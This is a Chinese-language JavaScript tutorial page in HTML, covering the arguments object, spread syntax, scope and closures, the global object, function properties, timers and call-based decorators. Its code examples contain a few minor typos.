<h2 id="arguments变量"><a href="#arguments变量" class="headerlink" title="arguments变量"></a><code>arguments</code>变量</h2><p><code>arguments</code>变量是一个特殊的类数组对象，该对象按参数索引包含所有参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.length);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> person <span class="keyword">of</span> <span class="built_in">arguments</span>) sum += <span class="number">1</span>; <span class="comment">// 可遍历的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showName(<span class="string">&#x27;Will&#x27;</span>); <span class="comment">// 1， &#x27;Will&#x27;, &#x27;undefined&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>箭头函数中没有<code>arguments</code>, 如果其嵌套在另一个“普通”函数中，则其访问到的<code>arguments</code>属于外部函数</p>
<h2 id="Spread-—"><a href="#Spread-—" class="headerlink" title="Spread — ..."></a>Spread — <code>...</code></h2><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p><code>...</code>+可迭代对象，即可将可迭代对象展开到参数列表中</p>
<p>用例：</p>
<ul>
<li><p>传递可迭代参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.max(<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">29</span>,<span class="number">0</span>); <span class="comment">// 29</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">29</span>,<span class="number">0</span>];</span><br><span class="line"><span class="built_in">Math</span>.max(...arr); <span class="comment">// 29</span></span><br><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,-<span class="number">9</span>];</span><br><span class="line"><span class="built_in">Math</span>.max(...arr, ...arr1); <span class="comment">// 29</span></span><br></pre></td></tr></table></figure></li>
<li><p>合并数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">0</span>,...arr1,...arr2];</span><br><span class="line">arr; <span class="comment">// [0,1,2,3,4,5,6]</span></span><br></pre></td></tr></table></figure></li>
<li><p>字符串 — 因为Spread语法内部使用迭代器来收集元素，与<code>for...of</code>方式相同</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line">[...str1]; <span class="comment">// [&#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from(str1); <span class="comment">// [&#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;]</span></span><br></pre></td></tr></table></figure>
<p><code>Array.from(obj)</code>和<code>[...obj]</code>的差别：</p>
<ul>
<li><code>Array.from(obj)</code>的适用范围更广，不仅适用于类数组对象也适用于可迭代对象</li>
<li>Spread语法只适用于可迭代对象</li>
</ul>
</li>
</ul>
<h2 id="获取一个array-object的副本"><a href="#获取一个array-object的副本" class="headerlink" title="获取一个array/object的副本"></a>获取一个array/object的副本</h2><p>即spread语法也可以实现类似<code>Object.assign()</code>的功能——即浅拷贝</p>
<p>用例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arrCopy = [...arr];</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(arr) === <span class="built_in">JSON</span>.stringify(arrCopy); <span class="comment">// true</span></span><br><span class="line">arr === arrCopy; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">arr.push(<span class="number">4</span>);</span><br><span class="line">arr; <span class="comment">// [1,2,3,4]</span></span><br><span class="line">arrCopy; <span class="comment">// [1,2,3]</span></span><br></pre></td></tr></table></figure>
<h1 id="变量作用域及闭包"><a href="#变量作用域及闭包" class="headerlink" title="变量作用域及闭包"></a>变量作用域及闭包</h1><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块 {...}"></a>代码块 <code>&#123;...&#125;</code></h2><p><strong>如果在代码块<code>&#123;...&#125;</code>中声明了一个变量。那么它只在该代码块内可见</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> only = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  only; <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">only; <span class="comment">// Error: only is not defined</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>在同一个代码块中，如果对已存在的变量，使用<code>let</code>或<code>const</code>进行重复声明，则会报错</p>
<h3 id="if-for-while"><a href="#if-for-while" class="headerlink" title="if, for, while"></a><code>if</code>, <code>for</code>, <code>while</code></h3><p>对于<code>if</code>、<code>for</code>、<code>while</code>等，在<code>&#123;...&#125;</code>中声明的变量也仅在内部可见</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i); <span class="comment">// 0,1,2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// Error, no such variable</span></span><br></pre></td></tr></table></figure>
<p><strong>表面上看，<code>let i</code>也位于<code>&#123;...&#125;</code>之外，但<code>for</code>构造十分特殊，在<code>()</code>中声明的变量也被视作代码块的一部分</strong></p>
<h2 id="嵌套函数"><a href="#嵌套函数" class="headerlink" title="嵌套函数"></a>嵌套函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">speak</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">infoMan</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name+<span class="string">&quot;: &quot;</span>+age;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(infoMan());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">speak(<span class="string">&quot;Will&quot;</span>, <span class="number">24</span>);</span><br></pre></td></tr></table></figure>
<h2 id="词法环境"><a href="#词法环境" class="headerlink" title="词法环境"></a>词法环境</h2><h3 id="Step1-变量"><a href="#Step1-变量" class="headerlink" title="Step1. 变量"></a>Step1. 变量</h3><p>在JS中，每个运行的函数，代码块<code>&#123;...&#125;</code>，以及整个脚本，都有一个被称为<strong>词法环境</strong>的隐藏的关联对象。该词法环境对象由两部分组成：</p>
<ol>
<li><strong>环境记录</strong>——一个将所有局部变量作为其属性的对象</li>
<li>对<strong>外部词法环境</strong>的引用，与外部代码相关联</li>
</ol>
<p>例如：</p>
<p><img src="../pic/ctx1.png" alt="image-20211004201352993"></p>
<p>如上图，矩形表示<strong>环境记录</strong>，箭头表示<strong>外部引用</strong>，由于全局词法环境没有外部引用，所以箭头指向了<code>null</code></p>
<p><strong>注：</strong>词法环境是一个<strong>规范对象</strong>，它仅仅是理论上存在，但我们无法在代码中获取该对象</p>
<h3 id="Step2-函数声明"><a href="#Step2-函数声明" class="headerlink" title="Step2. 函数声明"></a>Step2. 函数声明</h3><p><strong>注：函数声明的初始化会被立即执行完成</strong>，所以不同于变量声明，函数可以在其被定义前使用。但是不适用于将函数分配给变量的函数表达式，如<code>let say = function()&#123;...&#125;</code></p>
<h3 id="Step3-内部和外部的词法环境"><a href="#Step3-内部和外部的词法环境" class="headerlink" title="Step3. 内部和外部的词法环境"></a>Step3. 内部和外部的词法环境</h3><p>在一个函数运行时，在其调用刚开始时，会自动创建一个新的词法环境来存储这个调用的局部变量和参数</p>
<p><img src="../pic/ctx2.png" alt="image-20211004230247163"></p>
<p>如图所示，内部词法环境存储一个单独的属性<code>name</code>，外部词法环境即全局词法环境存储<code>phrase</code>变量和函数本身。并且<strong>当代码要访问一个变量时，首先会搜索内部词法环境，然后搜索外部词法环境，然后搜索更外部的，直至全局词法环境。</strong>因此内部词法环境引用了<code>outer</code>去访问变量<code>phrase</code>。</p>
<h3 id="Step4-返回函数"><a href="#Step4-返回函数" class="headerlink" title="Step4. 返回函数"></a>Step4. 返回函数</h3><p><img src="../pic/ctx3.png" alt="image-20211004233226300"></p>
<p>如果要更新变量的值，变量会在其所在的词法环境中更新其自身的值（即变量将在同一位置更新值）</p>
<h3 id="Plus-闭包"><a href="#Plus-闭包" class="headerlink" title="Plus: 闭包"></a>Plus: 闭包</h3><p><strong>定义：</strong>闭包是指内部函数总是可以访问在外部函数中声明的变量和参数。JavaScript中的函数会自动通过隐藏的词法环境存储了创建它们的位置，所以他们都可以访问外部的变量。</p>
<h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2><p>词法环境仅在可达到时才会被保留在内存中，否则词法环境及其中的所有变量都会被从内存中删除。</p>
<h1 id="全局对象"><a href="#全局对象" class="headerlink" title="全局对象"></a>全局对象</h1><p>全局对象提供任何地方都可以使用的变量和函数。在浏览器中，它叫<code>window</code>，在Node.js中，它叫<code>global</code>。但更通用的事<code>gloablThis</code>，几乎所有环境都支持该名称。</p>
<ul>
<li><p>全局对象的所有属性都可以直接被访问</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="built_in">window</span>.alert(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>使用<code>var</code>声明的变量会成为全局对象的属性（不建议使用）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rank = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.rank; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></li>
<li><p>如果要想在全局范围使用，可以直接将其作为属性写入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.rank = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">window</span>.admin = &#123;</span><br><span class="line">  name: <span class="string">&quot;Will&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">rank; <span class="comment">// 1</span></span><br><span class="line">admin.name; <span class="comment">// &#x27;Will&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="使用ployfills"><a href="#使用ployfills" class="headerlink" title="使用ployfills"></a>使用ployfills</h2></li>
</ul>
<p>使用全局对象测试对现代JS语言的支持情况</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">window</span>.Promise) &#123;</span><br><span class="line">  <span class="built_in">window</span>.Promise = ... <span class="comment">// 该旧版本浏览器不支持Promise对象，因此手动实现该现代语言功能</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="函数对象，NFE"><a href="#函数对象，NFE" class="headerlink" title="函数对象，NFE"></a>函数对象，NFE</h1><p><strong>在JS中，函数就是对象</strong>，即我们不仅可以<strong>调用</strong>它们，还可以把它们当作对象，<strong>增删属性，按引用传递。</strong></p>
<h2 id="属性-“name”"><a href="#属性-“name”" class="headerlink" title="属性 “name”"></a>属性 “name”</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHi.name; <span class="comment">// &#x27;sayHi&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="属性-”length“"><a href="#属性-”length“" class="headerlink" title="属性 ”length“"></a>属性 ”length“</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">a</span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params">a,b</span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f3</span>(<span class="params">a,b,..</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">f1.length; <span class="comment">// 1</span></span><br><span class="line">f2.length; <span class="comment">// 2</span></span><br><span class="line">f3.length; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>可知，rest参数不参与计数</p>
<h2 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h2><p><strong>注：</strong> 属性不是变量，定义函数的属性，并不会在函数内部定义一个局部变量，即<strong>属性和变量是两个毫不相关的东西。</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  sayHi.counter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHi.counter = <span class="number">0</span>;</span><br><span class="line">sayHi();</span><br><span class="line">sayHi();</span><br><span class="line">sayHi,counter; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="命名函数表达式（NFE-Named-Function-Expression）"><a href="#命名函数表达式（NFE-Named-Function-Expression）" class="headerlink" title="命名函数表达式（NFE, Named Function Expression）"></a>命名函数表达式（NFE, Named Function Expression）</h2><p><strong>定义：</strong>指带有名字的函数表达式</p>
<ol>
<li><p>普通函数表达式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sayHi = <span class="function"><span class="keyword">function</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(who);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>命名函数表达式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sayHi = <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(who);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>命名函数表达式有两个特殊地方：</strong></p>
<ol>
<li>允许函数内部引用自身</li>
<li>在函数外部不可见</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sayHi = <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (who) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(who);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    func(<span class="string">&quot;Guest&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHi(); <span class="comment">// &#x27;Guest&#x27;</span></span><br><span class="line">func(); <span class="comment">// Error, func is not defined</span></span><br></pre></td></tr></table></figure>
<h1 id="new-Function（很少用）"><a href="#new-Function（很少用）" class="headerlink" title="new Function（很少用）"></a>new Function（很少用）</h1></li>
</ol>
<p>语法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> func = <span class="keyword">new</span> <span class="built_in">Function</span> ([arg1, agr2, ...], functionBody);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sumNum = <span class="keyword">new</span> <span class="built_in">Function</span> (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;return a + z&#x27;</span>);</span><br><span class="line">sum(<span class="number">1</span>,<span class="number">3</span>); <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong><code>new Function</code>创建的函数的<code>[[Environment]]</code>不指向当前的词法环境，而是<strong>指向全局环境</strong>。</p>
<h1 id="调度：setTimeout和setInterval"><a href="#调度：setTimeout和setInterval" class="headerlink" title="调度：setTimeout和setInterval"></a>调度：setTimeout和setInterval</h1><p>有时，我们并不想立即执行一个函数，而是等待一段时间之后再执行，我们称之为“<strong>计划调用</strong>”（scheduling a call）</p>
<p>目前有两种实现：</p>
<ul>
<li><code>setTimeout</code>允许我们函数在一定时间间隔之后再执行，且仅执行一次</li>
<li><code>setInterval</code>允许我们一定的时间间隔重复运行该函数，从一定时间间隔之后开始运行</li>
</ul>
<p><strong>注：</strong>这两个方法并不在JS规范中，但大多数运行环境都有内建的调度程序，并提供了这些方法。目前，所有浏览器及Node.js都支持这两个方法</p>
<h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h2><p>语法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(func|codeString, delay, arg1, arg2, ...)</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ol>
<li><code>func|codeString</code>: 要执行的函数或代码字符串（不推荐）</li>
<li><code>delay</code>: 执行前的延迟，以毫秒为单位（1000ms = 1s），默认值为0</li>
<li><code>arg1</code>, <code>arg2, ...</code>: 被执行函数的参数</li>
<li><code>timerId</code>: 接收<code>setTimeout</code>返回的“定时器标识符（timer identifier）”</li>
</ol>
<p>例1：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">steTimeout(sayHi, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>例2:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;name&#125;</span>: <span class="subst">$&#123;age&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(sayHi, <span class="number">1000</span>, <span class="string">&#x27;Will&#x27;</span>, <span class="number">24</span>); <span class="comment">// Will: 24</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong><code>setTimeout</code>接收的是一个对函数的引用，因此通常情况不要传入一个函数的执行，如<code>sayHi()</code>，因此通常它们不会返回任何结果，<code>setTimeout</code>将接收到一个<code>undefined</code></p>
<h3 id="用clearTimeout来取消调度"><a href="#用clearTimeout来取消调度" class="headerlink" title="用clearTimeout来取消调度"></a>用<code>clearTimeout</code>来取消调度</h3><p><code>setTimeout</code>在调用时会返回一个“定时器标识符（timer identifier）”，我们可以用变量来接收它，并使用它来取消执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(...);</span><br><span class="line"><span class="built_in">clearTimeout</span>(timerId);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;Hello World!&#x27;</span>), <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(timerId); <span class="comment">// 定时器标识符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">clearTimeout</span>(timerId); <span class="comment">// 取消调度</span></span><br><span class="line"><span class="built_in">console</span>.log(timerId); <span class="comment">// 定时器标识符还在（并不会因为调度被取消而变成null）</span></span><br></pre></td></tr></table></figure>
<h2 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval"></a>setInterval</h2><p>语法与<code>setTimeout</code>完全相同</p>
<p>它们的区别是：</p>
<ul>
<li><code>setTimeout</code>只执行一次，但**<code>setInterval</code>是每间隔给定时间，周期性执行**</li>
<li>对于<code>setInterval</code>来说，内部调用程序会每隔一定时间执行一次function，但是function执行也需要时间，且其消耗时间算在“每隔一定时间”内，因此<strong>在使用<code>setInterval</code>时，function实际调用的间隔要比代码中设定的“每隔一定时间”要短</strong></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;tick&#x27;</span>), <span class="number">2000</span>); <span class="comment">// 每两秒打印一次&#x27;tick&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="built_in">clearInterval</span>(timerId), <span class="number">5000</span>); <span class="comment">// 5秒后停止</span></span><br></pre></td></tr></table></figure>
<h2 id="嵌套的setTimeout"><a href="#嵌套的setTimeout" class="headerlink" title="嵌套的setTimeout"></a>嵌套的setTimeout</h2><p>周期性调度有两种实现方式</p>
<ul>
<li><code>setInterval</code></li>
<li>嵌套的<code>setTimeout</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;tick&#x27;</span>);</span><br><span class="line">  timerId = <span class="built_in">setTimeout</span>(func1, <span class="number">1000</span>); <span class="comment">//嵌套</span></span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p><strong>嵌套的<code>setTimeout</code>比<code>setInterval</code>具有更多的灵活性，因此它可以根据当前执行结果来调度下一次调用</strong>。例如，如果一开始每5秒向服务器请求一次数据，但如果服务器过载了，那么就必须降低请求频率，如增加间隔时间</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> delay = <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...发送请求...</span><br><span class="line">  <span class="keyword">if</span> (由于服务器过载请求失败) &#123;</span><br><span class="line">    delay =* <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  timerId = <span class="built_in">setTimeout</span>(request, delay)</span><br><span class="line">&#125;, delay)</span><br></pre></td></tr></table></figure>
<h2 id="零延时的setTimeout"><a href="#零延时的setTimeout" class="headerlink" title="零延时的setTimeout"></a>零延时的setTimeout</h2><p>语法：<code>setTimeout(func, 0)</code>或<code>setTimeout(func)</code></p>
<p><strong>但<code>func</code>仍然要等到当前正在执行的脚本执行完成后，调度程序才会调用它。</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;World!&quot;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Hello, &quot;</span>);</span><br></pre></td></tr></table></figure>
<p>控制台的结果为：</p>
<p><code>&#39;Hello, &#39;</code></p>
<p><code>&#39;World!&#39;</code></p>
<h1 id="装饰器模式和转发-—-call-apply"><a href="#装饰器模式和转发-—-call-apply" class="headerlink" title="装饰器模式和转发 — call/apply"></a>装饰器模式和转发 — call/apply</h1><p>在JavaScript中，函数不仅可以被传递和用作对象，而且还可以在它们之间进行<strong>转发（forward）</strong>调用并<strong>装饰（decorate）</strong>它们。</p>
<h2 id="透明缓存"><a href="#透明缓存" class="headerlink" title="透明缓存"></a>透明缓存</h2><p>假设有一个CPU负载很重的函数，但它的结果非常稳定（即对于相同的输入值，它总返回相同的结果）。因此，我们希望将结果缓存下来，以节省重新计算的额外花费</p>
<p><strong>实现方式：</strong>创建一个包装器（wrapper）函数，同时该函数增加了缓存的功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slow</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cachingDecorator</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cache = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;      <span class="comment">// wrapper</span></span><br><span class="line">    <span class="keyword">if</span> (cache.has(x)) &#123;</span><br><span class="line">      <span class="keyword">return</span> cache.get(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = func(x);  <span class="comment">// (**)</span></span><br><span class="line">    </span><br><span class="line">    cache.set(x, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slow = cachingDecorator(slow);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(slow(<span class="number">1</span>)); <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(slow(<span class="number">2</span>)); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p><code>cachingDecorator</code>是一个<strong>装饰器（decorator）</strong>即它是一个特殊的函数，它接受另一个函数并改变其行为。</p>
<h2 id="使用”func-call”设定上下文"><a href="#使用”func-call”设定上下文" class="headerlink" title="使用”func.call”设定上下文"></a>使用”func.call”设定上下文</h2><p>上述的缓存装饰器不适用于对象方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> worker = &#123;</span><br><span class="line">  <span class="function"><span class="title">someMethod</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">slow</span>(<span class="params">x</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x * <span class="built_in">this</span>.someMethod(); <span class="comment">// (*)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">worker.slow = cachingDecorator(worker.slow);</span><br><span class="line">worker.slow(<span class="number">2</span>); <span class="comment">// Error: Cannot read property &#x27;someMethod&#x27; of undefined</span></span><br></pre></td></tr></table></figure>
<p>错误原因是，当调用<code>(*)</code>行时，使用的<code>this</code>是来自包装器在<code>(**)</code>行调用原始函数的<code>this=undefined</code>。</p>
<p><strong>使用内置的函数方法<code>function.call(context, arg1, arg2, ...)</code>可以显式设置<code>this    </code></strong></p>
<p>上述<code>cachingDecarator</code>代码第<code>(**)</code>应为<code>let result = func.call(this, x)</code>。此时<code>this=worker</code>。</p>
<p>其他用例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params">phrase</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name+<span class="string">&#x27;: &#x27;</span>+phrase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = &#123;<span class="attr">name</span>:<span class="string">&quot;John&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">say.call(user, <span class="string">&#x27;Hello&#x27;</span>); <span class="comment">// &#x27;John: Hello&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="传递多个参数"><a href="#传递多个参数" class="headerlink" title="传递多个参数"></a>传递多个参数</h3><p>例如，多参数<code>worker.slow</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> worker = &#123;</span><br><span class="line">  <span class="function"><span class="title">slow</span>(<span class="params">min, max</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + max;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决方法：</p>
<ol>
<li>实现一个类似map的多个键的数据结构</li>
<li><strong>使用嵌套map：</strong>即<code>cache.set(min)</code>存储键值对<code>(max, result)</code>。然后使用<code>cache.get(min).get(max)</code>来获取<code>result</code></li>
<li><strong>使用类似哈希函数：</strong>将两个值合并为一个</li>
</ol>
